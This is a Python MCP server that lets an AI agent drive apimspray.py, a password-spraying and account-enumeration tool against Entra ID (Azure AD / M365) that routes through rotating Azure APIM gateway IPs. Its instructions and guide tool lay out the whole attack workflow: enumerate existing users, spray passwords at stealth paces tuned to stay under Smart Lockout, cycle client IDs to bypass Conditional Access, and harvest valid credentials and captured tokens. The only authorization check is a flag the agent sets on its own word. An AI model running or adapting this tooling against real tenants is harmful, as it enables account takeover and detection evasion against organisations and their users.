#!/usr/bin/env python3
"""
mcp_apimspray - Model Context Protocol server that teaches an agent to drive
apimspray.py (Entra ID auth assessment via rotating APIM gateways).

Portable across MCP clients (Claude Code, Claude Desktop, third-party agent
frameworks). The operational knowledge lives in the server `instructions`, the
`guide` tool, and each tool's docstring, so the agent learns the workflow and
safety discipline — not just the flag names.

Run:  python3 mcp_apimspray.py          (stdio transport)
Deps: pip install mcp
Env:  APIMSPRAY_PATH  override path to apimspray.py (default: sibling of this file)
"""

import json
import os
import subprocess
import sys
from pathlib import Path

try:
    from mcp.server.fastmcp import FastMCP
except ImportError:
    sys.stderr.write("Missing dependency: pip install mcp\n")
    raise

SCRIPT = Path(os.environ.get("APIMSPRAY_PATH", Path(__file__).resolve().parent / "apimspray.py"))

MODES = ("spray", "validate", "validate-users", "validate-clients")
CRED_MODES = ("spray", "validate", "validate-clients")  # actually send passwords
PACES = ("stealth", "stealth-multi", "low", "mid", "medium", "high")

INSTRUCTIONS = """\
apimspray drives Entra ID (Azure AD / M365) authentication tests through a pool
of Azure APIM gateways used as rotating egress IPs.

AUTHORIZATION: spray/validate/validate-clients send real credentials to a real
tenant. Only run them for an authorized engagement with the target in scope. The
`run` tool refuses credential-sending modes unless `authorized=true` is passed —
set it only after confirming scope with the operator.

WORKFLOW:
1. Enumerate first with mode=validate-users (no password, no lockout) against the
   ENUM gateway list to learn which UPNs exist, then spray only those.
2. Spray/validate the pruned users at a conservative pace (low or stealth). Use
   safe_threshold as a circuit breaker.
3. Read results with `read_results`. For AADSTS53003 (Conditional Access blocked)
   hits, retry with mode=validate-clients across several client_ids.

SAFETY: default to pace=low/stealth on production tenants; high locks accounts
fast. Do NOT set shuffle_users in validate/validate-clients (it misaligns the 1:1
pairing). Leave tenant=common unless the gateways route a specific tenant path.

Call `guide` for the full playbook, mode table, and result-classification meanings.
"""

mcp = FastMCP("apimspray", instructions=INSTRUCTIONS)


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #

def _err(message, **extra):
    out = {"ok": False, "error": message}
    out.update(extra)
    return out


def _file_nonempty(path):
    p = Path(path)
    return p.exists() and p.is_file() and p.stat().st_size > 0


def _run_dirs(output):
    base = Path(output)
    if not base.is_dir():
        return []
    dirs = [p for p in base.iterdir() if p.is_dir() and not p.is_symlink()]
    return sorted(dirs, key=lambda p: p.stat().st_mtime, reverse=True)


def _summarize_run(run_dir):
    run_dir = Path(run_dir)
    manifest = {}
    mf = run_dir / "manifest.json"
    if mf.exists():
        try:
            manifest = json.loads(mf.read_text())
        except (json.JSONDecodeError, OSError):
            manifest = {}

    counts = {}
    valid = []
    rf = run_dir / "results.jsonl"
    if rf.exists():
        with open(rf, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    row = json.loads(line)
                except json.JSONDecodeError:
                    continue
                cls = str(row.get("classification", "UNKNOWN"))
                counts[cls] = counts.get(cls, 0) + 1
                if cls.startswith("VALID") or cls == "BLOCKED (Account Disabled)":
                    valid.append({
                        "username": row.get("username"),
                        "password": row.get("password"),
                        "classification": cls,
                        "aadsts": row.get("aadsts"),
                        "client_id": row.get("client_id"),
                        "has_token": row.get("has_token", False),
                    })

    tokens = 0
    tf = run_dir / "tokens.jsonl"
    if tf.exists():
        with open(tf, "r", encoding="utf-8") as f:
            tokens = sum(1 for line in f if line.strip())

    return {
        "run_dir": str(run_dir),
        "manifest": manifest,
        "counts_by_classification": counts,
        "valid": valid,
        "tokens_captured": tokens,
    }


# --------------------------------------------------------------------------- #
# Tools
# --------------------------------------------------------------------------- #

@mcp.tool()
def guide() -> str:
    """Return the full apimspray operational playbook: mode selection, lockout-safe
    pacing, client-app iteration, and how to read the results directory. Read this
    before the first run in a session."""
    return f"""\
apimspray — operational guide
=============================
Script: {SCRIPT}

MODES (mode= is required)
  validate-users : enumerate which UPNs exist via GetCredentialType. No password
                   sent -> NO lockout risk. Needs the ENUM gateway list.
  spray          : each password vs all users (1:N), chunked with lockout waits.
  validate       : 1:1 user:password pairs (equal-length user/password lists).
  validate-clients: 1:1 pairs tried against EVERY client_id; finds an app not
                   blocked by Conditional Access. Pass client_ids.

RECOMMENDED FLOW
  1. validate-users on enum gateways -> keep only existing UPNs.
  2. spray/validate those users at pace=low or stealth; set safe_threshold.
  3. read_results; for AADSTS53003 hits, retry with validate-clients.

PACE PROFILES (workers / delay / pass-per-chunk / lockout-wait / safe / jitter)
  high         15 / 0.1s / 10 / 5m  / 20 / 0%     (loud; locks accounts fast)
  medium (mid)  5 / 1.0s /  5 / 10m / 10 / 10%
  low (default) 2 / 5.0s /  2 / 15m /  5 / 20%
  stealth       1 / 30s  /  1 / 20m /  1 / 40%
  stealth-multi 5 / 30s  /  1 / 20m /  1 / 40%
  -> default to low/stealth on production tenants.

KEY OPTIONS
  safe_threshold N   abort once N accounts hit Smart Lockout (AADSTS50053)
  auto_throttle      slow global delay automatically when lockouts appear
  continue_on_success keep going after the first valid cred (default: stop)
  client_id / client_ids / resource / scope  pin or iterate client apps
  domain             append @domain to bare usernames
  user_batch_size / user_batch_delay  (spray) pause between user batches

RESULT CLASSIFICATIONS
  VALID (Token)                    password correct, token captured (tokens.jsonl)
  VALID (MFA Required/Conditional) password correct, MFA/CA gate -> still valid
  VALID (Conditional Access Blocked) AADSTS53003 -> retry via validate-clients
  LOCKED (Smart Lockout)           AADSTS50053 -> back off
  BLOCKED (Account Disabled)       valid but disabled
  FAILED (Invalid Creds/User Not Found)
  UNKNOWN (...) / ERROR            non-standard/HTTP/network failure. NOTE: these
                                   are NOT in the summary's Failed count; if a run
                                   looks empty, inspect UNKNOWN/ERROR rows.

FOOTGUNS
  - Never set shuffle_users with validate/validate-clients (misaligns 1:1 pairs).
  - Keep tenant=common unless gateways route a specific tenant (else silent 404s).
  - validate-users needs enum gateways (GetCredentialType); spray gateways 404.
"""


@mcp.tool()
def run(
    mode: str,
    urls: str,
    users: str | None = None,
    passwords: str | None = None,
    pace: str = "low",
    output: str = "results",
    domain: str | None = None,
    tenant: str = "common",
    client_id: str | None = None,
    client_ids: str | None = None,
    resource: str | None = None,
    scope: str | None = None,
    continue_on_success: bool = False,
    safe_threshold: int = 0,
    auto_throttle: bool = False,
    shuffle_users: bool = False,
    user_batch_size: int = 0,
    user_batch_delay: str = "5",
    authorized: bool = False,
    background: bool = True,
    timeout: int = 600,
) -> dict:
    """Launch an apimspray run.

    Required: mode (one of spray|validate|validate-users|validate-clients) and a
    non-empty `urls` file of APIM gateway URLs. `users` is required for all modes;
    `passwords` for spray/validate/validate-clients. For validate-users point
    `urls` at the ENUM gateway list.

    Credential-sending modes (spray/validate/validate-clients) require
    authorized=true — set it only after confirming the target is in an authorized
    engagement scope.

    background=true (default) spawns the run detached and returns immediately;
    poll list_runs/read_results for progress (sprays can run for many minutes with
    lockout waits). background=false runs to completion within `timeout` seconds
    and returns the parsed summary. Returns the command and, when known, run_dir.
    """
    # --- validation ---
    if mode not in MODES:
        return _err(f"invalid mode {mode!r}; choose one of {MODES}")
    if pace not in PACES:
        return _err(f"invalid pace {pace!r}; choose one of {PACES}")
    if not SCRIPT.exists():
        return _err(f"apimspray.py not found at {SCRIPT}; set APIMSPRAY_PATH")
    if not _file_nonempty(urls):
        return _err(f"urls file missing or empty: {urls}",
                    hint="provide a file of APIM gateway URLs, one per line")
    if not users:
        return _err("users file is required")
    if not _file_nonempty(users):
        return _err(f"users file missing or empty: {users}")
    if mode in CRED_MODES:
        if not passwords or not _file_nonempty(passwords):
            return _err(f"{mode} requires a non-empty passwords file")
        if not authorized:
            return _err(
                f"{mode} sends real credentials and requires authorized=true.",
                how_to_proceed="Confirm the target tenant/domain is in an "
                               "authorized engagement scope, then call run again "
                               "with authorized=true.",
            )
    # bake in the known footgun so other agents can't hit it
    if shuffle_users and mode in ("validate", "validate-clients"):
        return _err(
            "shuffle_users misaligns the 1:1 user:password pairing in "
            f"{mode} mode and would test every credential against the wrong "
            "password. Only use shuffle_users with mode=spray.",
        )

    warnings = []
    if tenant != "common":
        warnings.append(
            f"tenant={tenant!r}: gateways typically route only /common/oauth2/token; "
            "a non-common tenant may 404 every request (shown as UNKNOWN, not counted)."
        )
    if mode == "validate-users":
        warnings.append(
            "validate-users needs enum gateways exposing GetCredentialType; a "
            "spray-gateway URLs file will 404."
        )

    # --- build argv ---
    argv = [sys.executable, str(SCRIPT), "--mode", mode, "--urls", urls,
            "--users", users, "--pace", pace, "--output", output, "--tenant", tenant]
    if passwords:
        argv += ["--passwords", passwords]
    if domain:
        argv += ["--domain", domain]
    if client_id:
        argv += ["--client-id", client_id]
    if client_ids:
        argv += ["--client-ids", client_ids]
    if resource:
        argv += ["--resource", resource]
    if scope:
        argv += ["--scope", scope]
    if continue_on_success:
        argv += ["--continue-on-success"]
    if safe_threshold > 0:
        argv += ["--safe-threshold", str(safe_threshold)]
    if auto_throttle:
        argv += ["--auto-throttle"]
    if shuffle_users:
        argv += ["--shuffle-users"]
    if user_batch_size > 0:
        argv += ["--user-batch-size", str(user_batch_size)]
    if user_batch_delay != "5":
        argv += ["--user-batch-delay", user_batch_delay]

    cmd_str = " ".join(argv)

    # --- execute ---
    if background:
        log_dir = Path(output) / ".mcp_runs"
        log_dir.mkdir(parents=True, exist_ok=True)
        import time as _t
        log_path = log_dir / f"run_{int(_t.time())}.log"
        logf = open(log_path, "w", encoding="utf-8")
        proc = subprocess.Popen(
            argv, stdout=logf, stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL, start_new_session=True,
        )
        return {
            "ok": True,
            "status": "launched",
            "pid": proc.pid,
            "command": cmd_str,
            "log": str(log_path),
            "warnings": warnings,
            "next": "Poll list_runs(output) for the new run dir, then read_results(run_dir).",
        }

    try:
        completed = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout, stdin=subprocess.DEVNULL,
        )
    except subprocess.TimeoutExpired:
        return {
            "ok": False,
            "status": "timeout",
            "command": cmd_str,
            "warnings": warnings,
            "hint": f"run exceeded timeout={timeout}s; use background=true for long sprays.",
        }

    latest = _run_dirs(output)
    summary = _summarize_run(latest[0]) if latest else None
    tail = "\n".join((completed.stdout or "").splitlines()[-25:])
    return {
        "ok": completed.returncode == 0,
        "status": "finished",
        "returncode": completed.returncode,
        "command": cmd_str,
        "warnings": warnings,
        "stdout_tail": tail,
        "summary": summary,
    }


@mcp.tool()
def list_runs(output: str = "results") -> dict:
    """List apimspray run directories under `output`, newest first, each with a
    one-line manifest summary. Use after a background run to find its run_dir."""
    runs = []
    for d in _run_dirs(output):
        manifest = {}
        mf = d / "manifest.json"
        if mf.exists():
            try:
                manifest = json.loads(mf.read_text())
            except (json.JSONDecodeError, OSError):
                pass
        runs.append({
            "run_dir": str(d),
            "mode": manifest.get("mode"),
            "started": manifest.get("started"),
            "finished": manifest.get("finished"),
            "total_attempts": manifest.get("total_attempts"),
            "tokens_captured": manifest.get("tokens_captured"),
            "in_progress": "finished" not in manifest,
        })
    return {"ok": True, "output": output, "runs": runs}


@mcp.tool()
def read_results(run_dir: str) -> dict:
    """Parse a run directory into a structured summary: manifest, counts by
    classification, the list of valid credentials found, and token count. Pass a
    run_dir from list_runs (or `<output>/latest`)."""
    if not Path(run_dir).is_dir():
        return _err(f"not a directory: {run_dir}")
    result = _summarize_run(run_dir)
    result["ok"] = True
    return result


if __name__ == "__main__":
    mcp.run()
